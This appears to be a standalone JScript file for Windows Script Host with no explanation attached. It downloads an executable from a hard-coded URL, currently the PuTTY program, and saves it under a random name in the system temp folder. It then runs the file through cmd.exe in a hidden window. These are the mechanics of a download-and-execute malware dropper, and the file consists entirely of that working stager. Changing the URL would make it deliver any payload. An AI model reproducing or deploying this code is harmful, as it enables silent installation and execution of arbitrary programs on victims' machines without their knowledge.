// + CreateObject("WScript.Shell")



var url2down = "https://the.earth.li/~sgtatham/putty/latest/w32/putty.exe"




var FileName = "\\a"+rand(1000,90000)+".exe"




	function rand(min, max){
		if(!max && !min){
			min = 0;
			max = 99999999;
		}
		if(min && !max){
			max = min;
			min = 0;
		}
		return Math.floor(Math.random() * (max - min + 1)) + min;
	}



function downloadToFile(url, file) {
	

    var xhr = new ActiveXObject("msxml2.xmlhttp"), 
        ado = new ActiveXObject("ADODB.Stream");

    xhr.open("GET", url, false);
    xhr.send();
    if (xhr.status === 200) {
        ado.type = 1;
        ado.open();
        ado.write(xhr.responseBody);
        ado.saveToFile(file);
        ado.close();
    }
}


var FSO, list, i, Folder;
var FullPath, TxtFile;  


	FSO = WScript.CreateObject("Scripting.FileSystemObject");  
	FullPath = FSO.GetSpecialFolder(2).Path
	FullPath = FullPath + FileName
	


	downloadToFile(url2down ,FullPath )
	


   WScript.CreateObject("WScript.Shell").Run ("cmd.exe /c " + FullPath,0); 

